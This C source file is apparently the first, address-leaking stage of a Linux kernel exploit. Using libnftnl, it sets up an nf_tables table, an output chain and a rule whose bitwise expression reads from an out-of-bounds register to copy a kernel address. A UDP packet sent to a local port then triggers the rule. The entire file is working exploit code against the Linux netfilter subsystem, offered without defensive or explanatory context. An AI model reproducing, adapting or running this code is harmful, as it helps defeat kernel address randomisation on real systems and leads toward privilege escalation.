
#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <netinet/in.h>
#include <libmnl/libmnl.h>
#include <libnftnl/table.h>
#include <libnftnl/chain.h>
#include <libnftnl/rule.h>
#include <libnftnl/expr.h>

#include <time.h>
#include <stdlib.h>
#include <string.h>


#include <linux/limits.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#include <pthread.h>
#include <inttypes.h>
#include <assert.h>

#include <sched.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdarg.h>


typedef struct listener_data {
	uint16_t port;
	char address[8];
} listener_data;

enum rule_call_types {
	RULE_ADDRESS_LEAK,
};

typedef struct udp_data {
	char* data;
	size_t size;
	uint16_t port;
	char* addr;
	size_t addr_size;
} udp_data;


void *send_udp_packet(void *arg);

static struct nftnl_table *table_add_parse(char* table_name) {
	struct nftnl_table *t; // create struct
	uint16_t family = AF_INET; // the family of the table
	t = nftnl_table_alloc(); // allocate the table
	if (t == NULL) {
		perror("[!] Couldn't allocate a table");
		exit(EXIT_FAILURE);
	}

	nftnl_table_set_u32(t, NFTNL_TABLE_FAMILY, family); // set the family
	nftnl_table_set_str(t, NFTNL_TABLE_NAME, table_name); // set the name

	return t;
}

static struct nftnl_chain *chain_add_parse(char* table_name, char* chain_name, int hooknum)
{
	struct nftnl_chain *t;
	//int hooknum = NF_INET_LOCAL_OUT;

	t = nftnl_chain_alloc();
	if (t == NULL) {
		perror("[!] Couldn't allocate a chain");
		return NULL;
	}
	nftnl_chain_set_str(t, NFTNL_CHAIN_TABLE, table_name);
	nftnl_chain_set_str(t, NFTNL_CHAIN_NAME, chain_name);
	nftnl_chain_set_u32(t, NFTNL_CHAIN_PRIO, 0); // set priority to 0
	nftnl_chain_set_u32(t, NFTNL_CHAIN_HOOKNUM, hooknum);
	return t;
}

void setup_table_and_chain(char* table_name, char* base_chain_name, int hooknum){
	char buf_table[MNL_SOCKET_BUFFER_SIZE];
	char buf_chain[MNL_SOCKET_BUFFER_SIZE];
	struct nlmsghdr *nlh; // netlink message header
	uint32_t portid, t_seq, c_seq, table_seq, chain_seq, family;
	struct nftnl_table *t_table; // netfilter netlink table
	struct nftnl_chain *t_chain;
	struct mnl_nlmsg_batch *batch_table, *batch_chain;
	int ret;


	// **** TABLE SETUP ****

	t_table = table_add_parse(table_name); // the table
	t_seq = time(NULL); // t sequence num
	batch_table = mnl_nlmsg_batch_start(buf_table, sizeof(buf_table)); // starts a batch of messages
	nftnl_batch_begin(mnl_nlmsg_batch_current(batch_table), t_seq++); // 'begins' the batch

	mnl_nlmsg_batch_next(batch_table); // denominates that a new message starts
	table_seq = t_seq;
	family = nftnl_table_get_u32(t_table, NFTNL_TABLE_FAMILY); // get the family back?
	nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch_table), // build the netlink header
					NFT_MSG_NEWTABLE, family,
					NLM_F_CREATE|NLM_F_ACK, t_seq++);
	nftnl_table_nlmsg_build_payload(nlh, t_table); // build the payload
	nftnl_table_free(t_table); // free the allocated table
	mnl_nlmsg_batch_next(batch_table); // denominates that a new message can start

	nftnl_batch_end(mnl_nlmsg_batch_current(batch_table), t_seq++); // ends the nftnl batch section
	mnl_nlmsg_batch_next(batch_table);


	// **** CHAIN SETUP ****

	c_seq = time(NULL); // sequence num
	t_chain = chain_add_parse(table_name, base_chain_name, hooknum);
	batch_chain = mnl_nlmsg_batch_start(buf_chain, sizeof(buf_chain)); // starts a batch of messages
	nftnl_batch_begin(mnl_nlmsg_batch_current(batch_chain), c_seq++);
	mnl_nlmsg_batch_next(batch_chain);
	chain_seq = c_seq;
	family = NFPROTO_IPV4;
	nlh = nftnl_chain_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch_chain),
					NFT_MSG_NEWCHAIN, family,
					NLM_F_CREATE|NLM_F_ACK, c_seq++);
	nftnl_chain_nlmsg_build_payload(nlh, t_chain);
	nftnl_chain_free(t_chain); // free the allocated chain
	mnl_nlmsg_batch_next(batch_chain); // denominates that a new message can start

	nftnl_batch_end(mnl_nlmsg_batch_current(batch_chain), c_seq++); // nftnl batch section
	mnl_nlmsg_batch_next(batch_chain);


	// *** SETTING UP THE SOCKET ***
 	struct mnl_socket* nl_soc = mnl_socket_open(NETLINK_NETFILTER); // netlink socket
	if(nl_soc == NULL){
		perror("[!] mnl_socket_open");
		exit(EXIT_FAILURE);
	}


	if(mnl_socket_bind(nl_soc, 0, MNL_SOCKET_AUTOPID) < 0){ // attempt to bind
		perror("[!] mnl_socket_bind");
		exit(EXIT_FAILURE);
	}
	printf("[*] Socket is opened. \n");

	portid = mnl_socket_get_portid(nl_soc); // gets the portid

	// *** SENDING TABLE BATCH ***
	if (mnl_socket_sendto(nl_soc, mnl_nlmsg_batch_head(batch_table),
			      mnl_nlmsg_batch_size(batch_table)) < 0) {
		perror("[!] mnl_socket_send *table*");
		exit(EXIT_FAILURE);
	}
	mnl_nlmsg_batch_stop(batch_table); // stop the batch

	ret = mnl_socket_recvfrom(nl_soc, buf_table, sizeof(buf_table));
	while (ret > 0) {
		ret = mnl_cb_run(buf_table, ret, table_seq, portid, NULL, NULL);
		if (ret <= 0)
			break;
		ret = mnl_socket_recvfrom(nl_soc, buf_table, sizeof(buf_table));
	}

	if (ret == -1) {
		perror("[!] Error adding table");
		exit(EXIT_FAILURE);
	}
	printf("[*] Table %s created. \n", table_name);

	// *** SENDING CHAIN BATCH ***
	if (mnl_socket_sendto(nl_soc, mnl_nlmsg_batch_head(batch_chain),
			      mnl_nlmsg_batch_size(batch_chain)) < 0) {
		perror("[!] mnl_socket_send *chain*");
		exit(EXIT_FAILURE);
	}
	mnl_nlmsg_batch_stop(batch_chain); // stop the batch

	ret = mnl_socket_recvfrom(nl_soc, buf_chain, sizeof(buf_chain));
	while (ret > 0) {
		ret = mnl_cb_run(buf_chain, ret, chain_seq, portid, NULL, NULL);
		if (ret <= 0)
			break;
		ret = mnl_socket_recvfrom(nl_soc, buf_chain, sizeof(buf_chain));
	}

	if (ret == -1) {
		perror("[!] Error adding chain");
		exit(EXIT_FAILURE);
	}
	printf("[*] Chain %s created. \n", base_chain_name);

	mnl_socket_close(nl_soc);
}


static void add_bitwise(struct nftnl_rule *r, uint32_t shift_type, uint32_t expr_len,
    uint32_t expr_sreg, uint32_t expr_dreg, void* data, uint32_t data_len)
{

	if(expr_len > 0xff) {
		printf("Bitwise len is over 0xff \n");
		exit(EXIT_FAILURE);
	}

	struct nftnl_expr* e;
	e = nftnl_expr_alloc("bitwise");

	nftnl_expr_set_u32(e, NFTA_BITWISE_SREG, expr_sreg);
	nftnl_expr_set_u32(e, NFTA_BITWISE_DREG, expr_dreg);
	nftnl_expr_set_u32(e, NFTA_BITWISE_OP, shift_type);
	nftnl_expr_set_u32(e, NFTA_BITWISE_LEN, expr_len);
	nftnl_expr_set_data(e, NFTA_BITWISE_DATA, data, data_len);

	nftnl_rule_add_expr(r, e);

}

static void add_payload(struct nftnl_rule *r, uint32_t base, uint32_t offset, uint32_t len, uint32_t dreg) {
	struct nftnl_expr* e;
	e = nftnl_expr_alloc("payload");

	nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_OFFSET, offset);
	nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_LEN, len);
	nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_DREG, dreg);
	nftnl_expr_set_u32(e, NFTNL_EXPR_PAYLOAD_BASE, base);

	nftnl_rule_add_expr(r, e);

}

static void add_cmp(struct nftnl_rule *r, uint32_t op, uint32_t sreg, void* data, size_t data_len){
	struct nftnl_expr* e;
	e = nftnl_expr_alloc("cmp");
	nftnl_expr_set_u32(e, NFTA_CMP_OP, op);
	nftnl_expr_set_u32(e, NFTA_CMP_SREG, sreg);
	nftnl_expr_set_data(e, NFTA_CMP_DATA, data, data_len);

	nftnl_rule_add_expr(r, e);
}
static void set_verdict(struct nftnl_rule* r, uint32_t verdict)
{
	struct nftnl_expr* e;
	e = nftnl_expr_alloc("immediate");

	nftnl_expr_set_u32(e, NFTA_IMMEDIATE_DREG, 0); // 0 is verdict register

	nftnl_expr_set_u32(e, NFTNL_EXPR_IMM_VERDICT, verdict); // send the verdict
	nftnl_rule_add_expr(r, e);
}




static struct nftnl_rule* setup_leak_address_rule(uint8_t family, const char *table,
				   const char *chain, uint16_t port)
{
	struct nftnl_rule *r = NULL;

	r = nftnl_rule_alloc(); // attemps to allocate the rule
	if (r == NULL) {
		perror("[!] Couldn't allocate a rule");
		exit(EXIT_FAILURE);
	}

	nftnl_rule_set_str(r, NFTNL_RULE_TABLE, table);
	nftnl_rule_set_str(r, NFTNL_RULE_CHAIN, chain);
	nftnl_rule_set_u32(r, NFTNL_RULE_FAMILY, family);

	// *** CHECK PORT TO REDUCE NOISE ***
	// first we have to copy the port into a register
	// important: the destination port is at offset 2 bytes of the udp header
	// the port's size is also 2 bytes
	// we will copy it to (small) register 1
	add_payload(r, NFT_PAYLOAD_TRANSPORT_HEADER, 2, 2, NFT_REG32_01);

	// now we compare the port at register NFT_REG32_01 to the actual port where we will be sending stuff
	uint16_t port_net = htons(port); // we have to convert from little-endian to big
	add_cmp(r, NFT_CMP_EQ, NFT_REG32_01, &port_net, sizeof port_net);


	// *** PREPARE BITWISE EXPRESSION ***
	// This expression will be used to leak the address and save it
	// into a register
	uint32_t bitwise_len = 0x20; // the address is 8 bytes
	uint32_t bitwise_sreg = 0xfffffffe; // 0xfe * 4 = 0x3f8 (0x3c0 + 0x38) -> where the kernel address is
	uint32_t bitwise_dreg = NFT_REG32_05; // we write it into the first register
	uint32_t bitwise_shift_value_data = 0; // we set the shift value to 0 (that's the data)
	uint32_t bitwise_shift_type = NFT_BITWISE_RSHIFT; // must be NFT_BITWISE_LSHIFT or NFT_BITWISE_RSHIFT


	add_bitwise(r, bitwise_shift_type, bitwise_len, bitwise_sreg, bitwise_dreg, &bitwise_shift_value_data, sizeof(bitwise_shift_value_data));
	printf("[*] Bitwise expression is setup! \n");


	// *** SET THE VERDICT TO CONTINUE ***
	set_verdict(r, NFT_CONTINUE);
	printf("[*] Verdict is setup! \n");

	return r;
}


void add_rule(char* table_name, char* base_chain, char ruletype, uint16_t port,
 uint64_t kbase){
	struct mnl_socket *nl_soc;
	struct nftnl_rule *r;
	struct nlmsghdr *nlh;
	struct mnl_nlmsg_batch *batch;
	uint8_t family;
	char buf[MNL_SOCKET_BUFFER_SIZE];
	uint32_t seq = time(NULL);
	int ret;

	family = NFPROTO_IPV4;

	if (ruletype == RULE_ADDRESS_LEAK)
		r = setup_leak_address_rule(family, table_name, base_chain, port);
	else {
		printf("[!] No such rule code \n");
		exit(EXIT_FAILURE);
	}
	nl_soc = mnl_socket_open(NETLINK_NETFILTER);
	if (nl_soc == NULL) {
		perror("[!] mnl_socket_open");
		exit(EXIT_FAILURE);
	}

	if (mnl_socket_bind(nl_soc, 0, MNL_SOCKET_AUTOPID) < 0) {
		perror("[!] mnl_socket_bind");
		exit(EXIT_FAILURE);
	}
	batch = mnl_nlmsg_batch_start(buf, sizeof(buf));

	nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	nlh = nftnl_rule_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
		NFT_MSG_NEWRULE,
		nftnl_rule_get_u32(r, NFTNL_RULE_FAMILY),
		NLM_F_APPEND|NLM_F_CREATE|NLM_F_ACK, seq++);
	nftnl_rule_nlmsg_build_payload(nlh, r);
	nftnl_rule_free(r);
	mnl_nlmsg_batch_next(batch);

	nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
	mnl_nlmsg_batch_next(batch);

	ret = mnl_socket_sendto(nl_soc, mnl_nlmsg_batch_head(batch),
				mnl_nlmsg_batch_size(batch));
	if (ret == -1) {
		perror("[!] mnl_socket_sendto *rule*");
		exit(EXIT_FAILURE);
	}

	mnl_nlmsg_batch_stop(batch);

	ret = mnl_socket_recvfrom(nl_soc, buf, sizeof(buf));
	if (ret == -1) {
		perror("[!] mnl_socket_recvfrom");
		exit(EXIT_FAILURE);
	}

	ret = mnl_cb_run(buf, ret, 0, mnl_socket_get_portid(nl_soc), NULL, NULL);
	if (ret < 0) {
		perror("[!] mnl_cb_run");
		exit(EXIT_FAILURE);
	}

	mnl_socket_close(nl_soc);

}

void *send_udp_packet(void *arg){
	// first lets sleep for a second to wait for the listener to be setup
	sleep(0.5);
	udp_data *udata = (udp_data *) arg;
	size_t size = udata->size;
	char* data = udata->data;
	uint16_t port = udata->port;
	char* dest_addr = udata->addr;

	int sock;
	struct sockaddr_in addr;

	sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);

	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr.s_addr = inet_addr(dest_addr);

	sendto(sock, data, size, 0, (struct sockaddr *)&addr, sizeof(addr));

	close(sock);
}

int main(){
	/* ADDRESS LEAKING STAGE */
	char *leak_table_name = "leak_table",
			 *leak_base_chain_name = "output_chain";

	// first setup the table and chain with output hook
	setup_table_and_chain(leak_table_name, leak_base_chain_name, NF_INET_LOCAL_OUT);

	uint16_t port = 50005;

	// we setup the rules that will allow us to leak the address
	add_rule(leak_table_name, leak_base_chain_name, RULE_ADDRESS_LEAK, port, 0);
	printf("[*] Address leak rule created! \n");
	// lets actually leak this bad boy
	struct udp_data dummy_data;
	char* As = "AAAAAAAA";
	char* dest_addr = "127.0.0.1";
	dummy_data.data = As;
	dummy_data.size = sizeof(dummy_data.data) / sizeof(char);
	dummy_data.port = port;
	dummy_data.addr = dest_addr;
	dummy_data.addr_size = sizeof(dummy_data.addr);
	send_udp_packet((void*)&dummy_data);

	return 0;
}
